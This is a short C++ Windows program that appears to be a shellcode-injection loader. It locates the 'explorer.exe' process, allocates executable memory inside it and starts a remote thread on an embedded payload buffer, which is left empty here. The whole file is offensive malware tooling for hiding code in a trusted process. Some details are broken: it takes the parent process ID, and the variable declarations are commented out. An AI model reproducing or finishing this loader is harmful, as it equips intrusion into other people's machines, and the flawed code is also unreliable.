#include<Windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<cstring>
#include<tlhelp32.h>
#include<MSCorEE.h>

unsigned char start[] = { "" };
unsigned int start_len = 0; // Lenght of the payload

int FindTarget(const char * procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}
	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ParentProcessID;
			break;
		}
	}
	CloseHandle(hProcSnap);

	return pid;
}
int Inject(HANDLE hProc, unsigned char* start, unsigned int start_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	pRemoteCode = VirtualAllocEx(hProc, NULL, start_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID)start, (SIZE_T)start_len, (SIZE_T*)NULL);

	hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return -1;
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	//int pid = 0;
	//HANDLE hProc = NULL;

	pid = FindTarget("explorer.exe");

	if (pid) {

		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, start, start_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}